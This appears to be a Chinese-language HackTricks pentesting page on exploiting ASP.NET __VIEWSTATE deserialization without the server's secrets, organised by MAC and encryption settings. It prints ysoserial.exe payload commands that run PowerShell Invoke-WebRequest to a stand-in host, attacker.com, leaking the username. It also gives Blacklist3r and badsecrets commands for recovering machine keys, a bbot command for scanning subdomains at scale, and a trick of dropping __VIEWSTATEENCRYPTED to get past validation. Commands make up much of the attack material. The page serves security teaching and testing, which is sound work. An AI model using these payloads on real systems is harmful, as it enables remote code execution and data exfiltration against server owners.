<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Exploiting __VIEWSTATE without knowing the secrets</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="利用-__viewstate-而不知其秘密"><a class="header" href="#利用-__viewstate-而不知其秘密">利用 __VIEWSTATE 而不知其秘密</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级 <strong>漏洞赏金平台</strong>！今天就加入我们 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达 <strong>$100,000</strong> 的赏金！</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h2 id="什么是-viewstate"><a class="header" href="#什么是-viewstate">什么是 ViewState</a></h2>
<p><strong>ViewState</strong> 是 ASP.NET 中用于在网页之间维护页面和控件数据的默认机制。在渲染页面的 HTML 时，页面的当前状态和在回发期间要保留的值被序列化为 base64 编码的字符串。这些字符串随后被放置在隐藏的 ViewState 字段中。</p>
<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
<ul>
<li><strong>Base64</strong>：</li>
<li>当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，使用此格式。</li>
<li><strong>Base64 + 启用 MAC（消息认证码）</strong>：</li>
<li>通过将 <code>EnableViewStateMac</code> 属性设置为 true 来激活 MAC。这为 ViewState 数据提供完整性验证。</li>
<li><strong>Base64 + 加密</strong>：</li>
<li>当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时应用加密，以确保 ViewState 数据的机密性。</li>
</ul>
<h2 id="测试用例"><a class="header" href="#测试用例">测试用例</a></h2>
<p>该图像是一个表格，详细说明了基于 .NET 框架版本的 ASP.NET 中 ViewState 的不同配置。以下是内容摘要：</p>
<ol>
<li>对于 <strong>任何版本的 .NET</strong>，当 MAC 和加密都被禁用时，不需要 MachineKey，因此没有适用的方法来识别它。</li>
<li>对于 <strong>4.5 版本以下</strong>，如果启用了 MAC 但未启用加密，则需要 MachineKey。识别 MachineKey 的方法称为 "Blacklist3r"。</li>
<li>对于 <strong>4.5 版本以下</strong>，无论 MAC 是否启用，如果启用了加密，则需要 MachineKey。识别 MachineKey 是 "Blacklist3r - 未来开发" 的任务。</li>
<li>对于 <strong>4.5 版本及以上</strong>，所有 MAC 和加密的组合（无论两者都为 true，还是一个为 true 另一个为 false）都需要 MachineKey。可以使用 "Blacklist3r" 识别 MachineKey。</li>
</ol>
<h3 id="测试用例1--enableviewstatemacfalse-和-viewstateencryptionmodefalse"><a class="header" href="#测试用例1--enableviewstatemacfalse-和-viewstateencryptionmodefalse">测试用例：1 – EnableViewStateMac=false 和 viewStateEncryptionMode=false</a></h3>
<p>还可以通过将 <code>AspNetEnforceViewStateMac</code> 注册表项设置为零来完全禁用 ViewStateMAC：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
</code></pre>
<p><strong>识别 ViewState 属性</strong></p>
<p>您可以尝试通过使用 BurpSuite 捕获包含此参数的请求来识别 ViewState 是否受到 MAC 保护。如果未使用 Mac 保护该参数，您可以使用 <a href="https://github.com/pwntester/ysoserial.net"><strong>YSoSerial.Net</strong></a> 进行利用。</p>
<pre><code>ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
</code></pre>
<h3 id="test-case-15--like-test-case-1-but-the-viewstate-cookie-isnt-sent-by-the-server"><a class="header" href="#test-case-15--like-test-case-1-but-the-viewstate-cookie-isnt-sent-by-the-server">Test case 1.5 – Like Test case 1 but the ViewState cookie isn't sent by the server</a></h3>
<p>开发人员可以<strong>移除 ViewState</strong>，使其不成为 HTTP 请求的一部分（用户将不会收到此 cookie）。<br />
人们可能会假设，如果<strong>ViewState</strong>不<strong>存在</strong>，他们的实现就<strong>安全</strong>，不会出现与 ViewState 反序列化相关的潜在漏洞。<br />
然而，事实并非如此。如果我们<strong>将 ViewState 参数</strong>添加到请求体中，并发送我们使用 ysoserial 创建的序列化有效负载，我们仍然能够实现<strong>代码执行</strong>，如<strong>案例 1</strong>所示。</p>
<h3 id="test-case-2--net--45-and-enableviewstatemactrue--viewstateencryptionmodefalse"><a class="header" href="#test-case-2--net--45-and-enableviewstatemactrue--viewstateencryptionmodefalse">Test Case: 2 – .Net &lt; 4.5 and EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</a></h3>
<p>为了<strong>启用 ViewState MAC</strong>，我们需要在特定的 aspx 文件上进行以下更改：</p>
<pre><code class="language-bash">&lt;%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%&gt;
</code></pre>
<p>我们还可以通过在 <strong>web.config</strong> 文件中设置它来实现 <strong>整体</strong> 应用程序，如下所示：</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;configuration&gt;
&lt;system.web&gt;
&lt;customErrors mode="Off" /&gt;
&lt;machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" /&gt;
&lt;pages enableViewStateMac="true" /&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;
</code></pre>
<p>由于该参数受到MAC保护，因此要成功执行攻击，我们首先需要使用的密钥。</p>
<p>您可以尝试使用 <a href="https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper"><strong>Blacklist3r(AspDotNetWrapper.exe)</strong> </a> 来查找使用的密钥。</p>
<pre><code>AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
</code></pre>
<p><a href="https://github.com/blacklanternsecurity/badsecrets"><strong>Badsecrets</strong></a> 是另一个可以识别已知 machineKeys 的工具。它是用 Python 编写的，因此与 Blacklist3r 不同，没有 Windows 依赖。对于 .NET viewstates，有一个 "python blacklist3r" 工具，这是使用它的最快方法。</p>
<p>它可以直接提供 viewstate 和 generator：</p>
<pre><code>pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
</code></pre>
<p><img src="https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png" alt="https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png" /></p>
<p>或者，它可以直接连接到目标 URL，并尝试从 HTML 中提取 viewstate：</p>
<pre><code>pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
</code></pre>
<p><img src="https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png" alt="https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png" /></p>
<p>为了大规模搜索易受攻击的 viewstate，结合子域枚举，可以使用 <code>badsecrets</code> <a href="exploiting-__viewstate-parameter.html"><strong>BBOT</strong></a> 模块：</p>
<pre><code>bbot -f subdomain-enum -m badsecrets -t evil.corp
</code></pre>
<p><img src="https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png" alt="https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png" /></p>
<p>如果你运气好并且找到了密钥，你可以使用 <a href="https://github.com/pwntester/ysoserial.net"><strong>YSoSerial.Net</strong></a>**：</p>
<pre><code>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
</code></pre>
<p>在服务器<strong>未发送</strong><code>_VIEWSTATEGENERATOR</code>参数的情况下，您<strong>不</strong>需要<strong>提供</strong><code>--generator</code>参数<strong>而是这些</strong>：</p>
<pre><code class="language-bash">--apppath="/" --path="/hello.aspx"
</code></pre>
<h3 id="test-case-3--net--45-和-enableviewstatemactruefalse-和-viewstateencryptionmodetrue"><a class="header" href="#test-case-3--net--45-和-enableviewstatemactruefalse-和-viewstateencryptionmodetrue">Test Case: 3 – .Net &lt; 4.5 和 EnableViewStateMac=true/false 和 ViewStateEncryptionMode=true</a></h3>
<p>在这种情况下，不知道该参数是否受到MAC保护。然后，值可能被加密，您将<strong>需要机器密钥来加密您的有效负载</strong>以利用该漏洞。</p>
<p><strong>在这种情况下，</strong> <a href="https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper"><strong>Blacklist3r</strong></a> <strong>模块正在开发中...</strong></p>
<p><strong>在 .NET 4.5 之前，</strong> ASP.NET 可以<strong>接受</strong>来自用户的<strong>未加密</strong> _<code>__VIEWSTATE</code>_ 参数，即使**<code>ViewStateEncryptionMode</code><strong>已设置为_<strong>始终</strong>_。ASP.NET <strong>仅检查</strong>请求中</strong><code>__VIEWSTATEENCRYPTED</code><strong>参数的</strong>存在**。<strong>如果删除此参数并发送未加密的有效负载，它仍然会被处理。</strong></p>
<p>因此，如果攻击者通过其他漏洞（如文件遍历）找到获取机器密钥的方法，可以使用在<strong>案例 2</strong>中使用的<a href="https://github.com/pwntester/ysoserial.net"><strong>YSoSerial.Net</strong></a>命令，通过ViewState反序列化漏洞执行RCE。</p>
<ul>
<li>从请求中删除<code>__VIEWSTATEENCRYPTED</code>参数，以利用ViewState反序列化漏洞，否则将返回Viewstate MAC验证错误，利用将失败。</li>
</ul>
<h3 id="test-case-4--net--45-和-enableviewstatemactruefalse-和-viewstateencryptionmodetruefalse除了两个属性为false"><a class="header" href="#test-case-4--net--45-和-enableviewstatemactruefalse-和-viewstateencryptionmodetruefalse除了两个属性为false">Test Case: 4 – .Net &gt;= 4.5 和 EnableViewStateMac=true/false 和 ViewStateEncryptionMode=true/false，除了两个属性为false</a></h3>
<p>我们可以通过在web.config文件中指定以下参数来强制使用ASP.NET框架，如下所示。</p>
<pre><code class="language-xml">&lt;httpRuntime targetFramework="4.5" /&gt;
</code></pre>
<p>或者，可以通过在 web.config 文件的 <code>machineKey</code> 参数中指定以下选项来完成此操作。</p>
<pre><code class="language-bash">compatibilityMode="Framework45"
</code></pre>
<p>如前所述，<strong>值是加密的。</strong> 然后，要发送<strong>有效的有效负载，攻击者需要密钥</strong>。</p>
<p>您可以尝试使用 <a href="https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper"><strong>Blacklist3r(AspDotNetWrapper.exe)</strong> </a>来查找正在使用的密钥：</p>
<pre><code>AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
</code></pre>
<p>对于IISDirPath和TargetPagePath的更详细描述 <a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/">refer here</a></p>
<p>或者，使用 <a href="https://github.com/blacklanternsecurity/badsecrets"><strong>Badsecrets</strong></a>（带生成器值）：</p>
<pre><code class="language-bash">cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
</code></pre>
<p><img src="https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png" alt="https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png" /></p>
<p>一旦识别出有效的机器密钥，<strong>下一步是使用</strong> <a href="https://github.com/pwntester/ysoserial.net"><strong>YSoSerial.Net</strong></a> <strong>生成序列化有效负载</strong></p>
<pre><code>ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
</code></pre>
<p>如果你有<code>__VIEWSTATEGENERATOR</code>的值，你可以尝试使用<code>--generator</code>参数并省略<code>--path</code>和<code>--apppath</code>参数。</p>
<p><img src="https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png" alt="" /></p>
<p>成功利用ViewState反序列化漏洞将导致向攻击者控制的服务器发出带有用户名的带外请求。这种利用方式在一个名为“使用Blacklist3r和YsoSerial.NET利用ViewState反序列化”的资源中有证明概念（PoC）。有关利用过程如何工作以及如何使用像Blacklist3r这样的工具来识别MachineKey的更多细节，可以查看提供的<a href="https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC">成功利用的PoC</a>。</p>
<h3 id="测试用例6--使用了viewstateuserkeys"><a class="header" href="#测试用例6--使用了viewstateuserkeys">测试用例6 – 使用了ViewStateUserKeys</a></h3>
<p><strong>ViewStateUserKey</strong>属性可以用来<strong>防御****CSRF攻击</strong>。如果在应用程序中定义了这样的密钥，并且我们尝试使用到目前为止讨论的方法生成<strong>ViewState</strong>有效负载，则<strong>有效负载将不会被应用程序处理</strong>。<br />
你需要使用一个额外的参数来正确创建有效负载：</p>
<pre><code class="language-bash">--viewstateuserkey="randomstringdefinedintheserver"
</code></pre>
<h3 id="成功利用的结果"><a class="header" href="#成功利用的结果">成功利用的结果 <a href="#poc" id="poc"></a></a></h3>
<p>对于所有测试用例，如果 ViewState YSoSerial.Net 负载 <strong>成功</strong> 工作，则服务器响应“<strong>500 内部服务器错误</strong>”，响应内容为“<strong>该页面的状态信息无效，可能已损坏</strong>”，并且我们获得 OOB 请求。</p>
<p>查看 <a href="https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/%5B**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**%5D(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md">进一步信息这里</a></p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/"><strong>https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/</strong></a></li>
<li><a href="https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817"><strong>https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</strong></a>\</li>
<li><a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/"><strong>https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</strong></a></li>
<li><a href="https://blog.blacklanternsecurity.com/p/introducing-badsecrets"><strong>https://blog.blacklanternsecurity.com/p/introducing-badsecrets</strong></a></li>
</ul>
<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级 <strong>漏洞赏金平台</strong>！今天加入我们 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达 <strong>$100,000</strong> 的赏金！</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客攻击： <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/deserialization/python-yaml-deserialization.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
